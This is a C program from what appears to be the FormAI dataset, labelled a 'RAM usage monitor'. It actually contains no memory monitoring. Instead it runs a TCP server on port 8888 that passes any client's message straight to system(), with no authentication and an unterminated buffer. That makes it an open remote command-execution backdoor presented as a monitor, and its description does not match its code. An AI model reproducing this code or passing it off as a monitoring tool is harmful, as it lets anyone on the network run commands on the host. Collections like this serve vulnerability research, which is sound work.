//FormAI DATASET v1.0 Category: RAM usage monitor ; Style: distributed
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>

#define MAX_CLIENTS 20
#define PORT 8888
#define BUFF_SIZE 1024

int main()
{
    int serverSock, newSock, valread, activity, sd, max_sd;
    struct sockaddr_in address;
    char buffer[BUFF_SIZE] = {0};
    int clientSockets[MAX_CLIENTS];
    int i, max_clients = MAX_CLIENTS;
    fd_set readfds;

    for (i = 0; i<max_clients; i++)
        clientSockets[i] = 0;

    if ((serverSock = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        printf("Socket create error!\n");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(serverSock, (struct sockaddr *)&address, sizeof(address))<0)
    {
        printf("Bind error!\n");
        exit(EXIT_FAILURE);
    }

    if (listen(serverSock, 5) < 0)
    {
        printf("Listen error!\n");
        exit(EXIT_FAILURE);
    }

    int addrlen = sizeof(address);

    printf("Waiting for connections...\n");

    while(1)
    {
        FD_ZERO(&readfds);
        FD_SET(serverSock, &readfds);
        max_sd = serverSock;

        for (i=0; i< max_clients; i++)
        {
            sd = clientSockets[i];

            if(sd > 0)
                FD_SET(sd, &readfds);

            if(sd > max_sd)
                max_sd = sd;
        }

        activity = select(max_sd+1, &readfds, NULL, NULL, NULL);

        if ((activity < 0) && (errno!=EINTR))
        {
            printf("Select error!\n");
            exit(EXIT_FAILURE);
        }

        if (FD_ISSET(serverSock, &readfds))
        {
            if ((newSock = accept(serverSock, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0)
            {
                printf("Accept error!\n");
                exit(EXIT_FAILURE);
            }

            printf("New connection %d\n", newSock);

            for (i=0; i<max_clients; i++)
            {
                if( clientSockets[i] == 0 )
                {
                    clientSockets[i] = newSock;
                    break;
                }
            }
        }

        for (i=0; i<max_clients; i++)
        {
            sd = clientSockets[i];

            if (FD_ISSET(sd, &readfds))
            {
                if ((valread = read(sd, buffer, BUFF_SIZE)) == 0)
                {
                    getpeername(sd, (struct sockaddr*)&address, (socklen_t*)&addrlen);
                    printf("Host disconnected, IP %s, Port %d\n",
                           inet_ntoa(address.sin_addr), ntohs(address.sin_port));
                    close(sd);
                    clientSockets[i] = 0;
                }
                else
                {
                    printf("Received message: %s\n",buffer);
                    system(buffer);
                    send(sd, buffer, strlen(buffer), 0);
                }
            }
        }
    }

    return 0;
}